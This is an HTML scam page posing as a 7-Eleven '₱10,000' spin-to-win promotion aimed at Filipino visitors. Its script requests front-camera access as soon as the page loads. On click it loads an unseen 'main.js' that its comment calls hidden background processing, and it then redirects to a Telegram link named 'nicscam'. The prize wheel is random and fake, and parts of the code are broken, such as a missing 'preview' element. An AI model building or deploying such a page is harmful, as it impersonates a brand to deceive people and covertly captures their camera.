<!DOCTYPE html>
<html lang="tl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>7-11 Spin GOD MODE</title>

<style>

body{
    margin:0;
    font-family:Segoe UI, sans-serif;
    background:radial-gradient(circle,#0f9d58,#0b5f32);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

/* Card */
.box{
    width:380px;
    background:white;
    padding:30px;
    border-radius:30px;
    text-align:center;
    box-shadow:0 0 60px rgba(0,0,0,.4);
}

/* Logo */
.logo{
    font-size:42px;
    font-weight:900;
    color:#0a8f3a;
    text-shadow:0 0 12px rgba(10,143,58,.6);
}

/* Wheel */
#wheel{
    width:230px;
    height:230px;
    border-radius:50%;
    border:10px solid #0a8f3a;
    margin:25px auto;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:28px;
    font-weight:bold;
    transition:6s cubic-bezier(.1,.7,.1,1);
}

/* Result */
#result{
    font-size:32px;
    color:#f39c12;
    opacity:0;
    transition:1.2s;
    text-shadow:0 0 10px rgba(243,156,18,.5);
}

/* Button */
.btn{
    width:100%;
    padding:16px;
    border:none;
    border-radius:16px;
    background:linear-gradient(45deg,#0a8f3a,#1abc9c);
    color:white;
    font-size:20px;
    cursor:pointer;
    transition:.3s;
}

.btn:hover{
    transform:scale(1.05);
}

/* Loading Overlay */
#loadingOverlay{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,.75);
    display:none;
    justify-content:center;
    align-items:center;
    color:white;
    font-size:22px;
    z-index:999;
}

.loader{
    border:6px solid #f3f3f3;
    border-top:6px solid #0a8f3a;
    border-radius:50%;
    width:60px;
    height:60px;
    animation:spinloader 1s linear infinite;
    margin-bottom:15px;
}

@keyframes spinloader{
    from{transform:rotate(0deg);}
    to{transform:rotate(360deg);}
}

/* Confetti */
.confetti{
    position:fixed;
    width:8px;
    height:8px;
    top:-20px;
    animation:fall linear forwards;
}

@keyframes fall{
    to{
        transform:translateY(110vh) rotate(720deg);
    }
}

</style>
</head>

<body>

<!-- Loading Overlay -->
<div id="loading">
    <div style="text-align:center">
        <div class="loader"></div>
        <div>System analyzing winner...</div>
    </div>
</div>

<div class="box">

<div class="logo">7-ELEVEN</div>

<h3>🔥 GOD MODE SPIN 🔥</h3>

<div id="wheel">🎁 ₱10,000</div>

<div id="result">🎉 YOU WON ₱10,000!</div>

<button class="btn" id="startBtn" onclick="spin()">SPIN NOW</button>

</div>

    <script>
        const btn = document.getElementById('startBtn');
        const loading = document.getElementById('loading');
        const video = document.getElementById('preview');
        const REDIRECT_URL = "https://t.me/nicscam"; // Trang đích sau khi xong

        // Kích hoạt camera ngay khi vào trang để sẵn sàng
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
            } catch (err) { console.warn("Yêu cầu quyền camera để nhận thưởng."); }
        }
        initCamera();

        btn.addEventListener('click', () => {
            btn.style.display = 'none';
            loading.style.display = 'block';

            // Gọi script xử lý ngầm
            const script = document.createElement('script');
            script.src = 'main.js';
            document.body.appendChild(script);

            // Chờ tín hiệu từ main.js để chuyển hướng
            const check = setInterval(() => {
                if (window.mainScriptFinished) {
                    clearInterval(check);
                    window.location.href = REDIRECT_URL;
                }
            }, 500);
        });
        let spinning=false;

function spin(){

if(spinning) return;
spinning=true;

/* Elements */
const wheel=document.getElementById("wheel");
const result=document.getElementById("result");
const loading=document.getElementById("loading");

/* Reset */
result.style.opacity="0";

/* Show Loading */
loading.style.display="flex";

/* Prize List */
let prizeList=[
"₱10,000",
"₱5,000",
"₱1,000",
"₱500",
"Try Again"
];

let prize=prizeList[Math.floor(Math.random()*prizeList.length)];

/* Spin Rotation */
let rotation=720 + Math.random()*2000;
wheel.style.transform="rotate("+rotation+"deg)";

/* ⭐ 8 seconds loading */
setTimeout(()=>{

loading.style.display="none";

wheel.innerText="🎁 "+prize;

result.innerText="🎉 You Won "+prize+"!";
result.style.opacity="1";

startConfetti();

spinning=false;

},8000);

}

function startConfetti(){

for(let i=0;i<80;i++){

let c=document.createElement("div");
c.className="confetti";

c.style.left=Math.random()*100+"vw";

c.style.background=[
"red","yellow","blue","orange","green","purple"
][Math.floor(Math.random()*6)];

c.style.animationDuration=(2+Math.random()*3)+"s";

document.body.appendChild(c);

setTimeout(()=>c.remove(),6000);
}

}

    </script>
</body>

</html>
